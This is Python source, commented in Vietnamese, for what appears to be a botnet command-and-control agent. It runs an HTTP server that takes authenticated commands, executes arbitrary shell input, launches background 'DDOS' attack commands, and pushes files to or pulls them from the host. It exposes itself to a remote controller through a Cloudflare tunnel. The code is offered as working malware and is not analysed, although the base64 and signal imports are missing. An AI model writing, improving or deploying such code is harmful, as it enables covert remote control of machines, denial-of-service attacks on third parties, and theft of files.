import http.server
import socketserver
import subprocess
import threading
import os
import json
import platform
import socket
import time
import sys
import tempfile
import atexit

# --- CẤU HÌNH NODE ---
PORT = 8080
SECRET_KEY = "S3cr3t_C2_K3y"
CLOUDFLARED_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
TUNNEL_DOMAIN = None  # Sẽ được cấu hình tự động

class C2Handler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def do_GET(self):
        """Heartbeat & Info"""
        if self.headers.get('X-Auth') != SECRET_KEY:
            self._set_headers(403)
            return

        info = {
            "status": "ONLINE",
            "os": f"{platform.system()} {platform.release()}",
            "hostname": socket.gethostname(),
            "arch": platform.machine(),
            "type": "PYTHON-AGENT",
            "timestamp": time.time(),
            "tunnel_url": TUNNEL_DOMAIN
        }
        self._set_headers(200)
        self.wfile.write(json.dumps(info).encode('utf-8'))

    def do_POST(self):
        """Execute: Nhận lệnh từ C2"""
        if self.headers.get('X-Auth') != SECRET_KEY:
            self._set_headers(403)
            return

        content_length = int(self.headers.get('Content-Length', 0))
        if content_length:
            post_data = self.rfile.read(content_length).decode('utf-8')
        else:
            post_data = "{}"
        
        try:
            data = json.loads(post_data)
            cmd_type = data.get("type")
            payload = data.get("command")

            response = {}

            if cmd_type == "SHELL":
                print(f"\x1b[33m[TASK] Executing: {payload}\x1b[0m")
                try:
                    # Giới hạn thời gian thực thi lệnh
                    output = subprocess.check_output(
                        payload, 
                        shell=True, 
                        stderr=subprocess.STDOUT, 
                        timeout=30,
                        universal_newlines=True
                    )
                    response["output"] = output
                    response["status"] = "SUCCESS"
                except subprocess.TimeoutExpired:
                    response["output"] = "Command timeout after 30 seconds"
                    response["status"] = "TIMEOUT"
                except Exception as e:
                    response["output"] = str(e)
                    response["status"] = "ERROR"
            
            elif cmd_type == "DDOS":
                print(f"\x1b[31m[ATTACK] Launching: {payload}\x1b[0m")
                try:
                    # Chạy trong background
                    subprocess.Popen(
                        payload, 
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        start_new_session=True
                    )
                    response["output"] = "Attack command deployed to background process."
                    response["status"] = "SUCCESS"
                except Exception as e:
                    response["output"] = str(e)
                    response["status"] = "ERROR"
                    
            elif cmd_type == "PING":
                response["status"] = "PONG"
                response["timestamp"] = time.time()
                
            elif cmd_type == "UPLOAD":
                # Tải file từ C2
                filename = data.get("filename")
                file_data = data.get("data")
                if filename and file_data:
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(file_data))
                    response["status"] = "UPLOAD_SUCCESS"
                    response["filename"] = filename
                else:
                    response["status"] = "UPLOAD_ERROR"
                    
            elif cmd_type == "DOWNLOAD":
                # Gửi file về C2
                filename = payload
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        file_content = base64.b64encode(f.read()).decode('utf-8')
                    response["status"] = "DOWNLOAD_SUCCESS"
                    response["filename"] = filename
                    response["data"] = file_content
                else:
                    response["status"] = "FILE_NOT_FOUND"
                    
            else:
                response["status"] = "UNKNOWN_CMD"

        except Exception as e:
            response["status"] = "ERROR"
            response["output"] = str(e)

        self._set_headers(200)
        self.wfile.write(json.dumps(response).encode('utf-8'))

    def log_message(self, format, *args):
        # Tắt log mặc định
        return

class CloudflaredTunnel:
    def __init__(self):
        self.cloudflared_path = "/usr/local/bin/cloudflared"
        self.tunnel_process = None
        self.tunnel_url = None
        self.running = True
        
    def install_cloudflared(self):
        """Cài đặt cloudflared nếu chưa có"""
        if not os.path.exists(self.cloudflared_path):
            print(f"\x1b[36m[*] Installing cloudflared...\x1b[0m")
            
            # Tải cloudflared
            download_cmd = f"curl -L {CLOUDFLARED_URL} -o cloudflared.tmp"
            os.system(download_cmd)
            
            # Cấp quyền thực thi
            os.system("chmod +x cloudflared.tmp")
            
            # Di chuyển vào /usr/local/bin
            os.system(f"sudo mv cloudflared.tmp {self.cloudflared_path}")
            
            print(f"\x1b[92m[+] cloudflared installed successfully\x1b[0m")
        else:
            print(f"\x1b[92m[✓] cloudflared already installed\x1b[0m")
            
    def start_tunnel(self):
        """Tạo tunnel với cloudflared"""
        try:
            print(f"\x1b[36m[*] Starting Cloudflare Tunnel...\x1b[0m")
            
            # Tạo tunnel mới
            tunnel_cmd = f"{self.cloudflared_path} tunnel --url http://localhost:{PORT}"
            self.tunnel_process = subprocess.Popen(
                tunnel_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
                preexec_fn=os.setsid
            )
            
            # Đọc output để lấy URL
            def read_tunnel_output():
                global TUNNEL_DOMAIN
                for line in iter(self.tunnel_process.stdout.readline, ''):
                    if not self.running:
                        break
                    
                    line = line.strip()
                    print(f"\x1b[90m[CLOUDFLARED] {line}\x1b[0m")
                    
                    # Tìm URL trong output
                    if ".trycloudflare.com" in line:
                        # Các định dạng URL có thể có
                        if "https://" in line:
                            TUNNEL_DOMAIN = line.split("https://")[-1].strip()
                        else:
                            TUNNEL_DOMAIN = line.strip()
                        
                        print(f"\x1b[92m[+] TUNNEL ESTABLISHED: https://{TUNNEL_DOMAIN}\x1b[0m")
                        print(f"\x1b[90m    (Add this URL to user.txt on Controller)\x1b[0m")
                        break
            
            # Chạy trong thread riêng
            output_thread = threading.Thread(target=read_tunnel_output)
            output_thread.daemon = True
            output_thread.start()
            
            # Chờ 10 giây để tunnel khởi tạo
            time.sleep(10)
            
            # Giữ tunnel chạy
            while self.running and self.tunnel_process.poll() is None:
                time.sleep(1)
                
            if self.tunnel_process.returncode is not None:
                print(f"\x1b[31m[!] Tunnel process died, restarting...\x1b[0m")
                
        except Exception as e:
            print(f"\x1b[31m[!] Tunnel error: {e}\x1b[0m")
            
    def stop_tunnel(self):
        """Dừng tunnel"""
        self.running = False
        if self.tunnel_process:
            try:
                os.killpg(os.getpgid(self.tunnel_process.pid), signal.SIGTERM)
            except:
                pass

def run_server():
    """Chạy HTTP server"""
    server = socketserver.TCPServer(("0.0.0.0", PORT), C2Handler)
    print(f"\x1b[95m[+] Agent listening on port {PORT}\x1b[0m")
    print(f"\x1b[95m[+] Secret Key: {SECRET_KEY}\x1b[0m")
    server.serve_forever()

def cleanup():
    """Dọn dẹp khi thoát"""
    print(f"\x1b[31m[!] Shutting down...\x1b[0m")
    os._exit(0)

if __name__ == "__main__":
    # Đăng ký cleanup khi thoát
    atexit.register(cleanup)
    
    # Khởi tạo và chạy tunnel
    tunnel = CloudflaredTunnel()
    
    # Cài đặt cloudflared
    tunnel.install_cloudflared()
    
    # Chạy tunnel trong thread riêng
    tunnel_thread = threading.Thread(target=tunnel.start_tunnel)
    tunnel_thread.daemon = True
    tunnel_thread.start()
    
    # Chờ một chút để tunnel khởi tạo
    time.sleep(5)
    
    try:
        # Chạy HTTP server
        run_server()
    except KeyboardInterrupt:
        print(f"\x1b[33m[!] Interrupted by user\x1b[0m")
        tunnel.stop_tunnel()
    except Exception as e:
        print(f"\x1b[31m[!] Fatal error: {e}\x1b[0m")
        tunnel.stop_tunnel()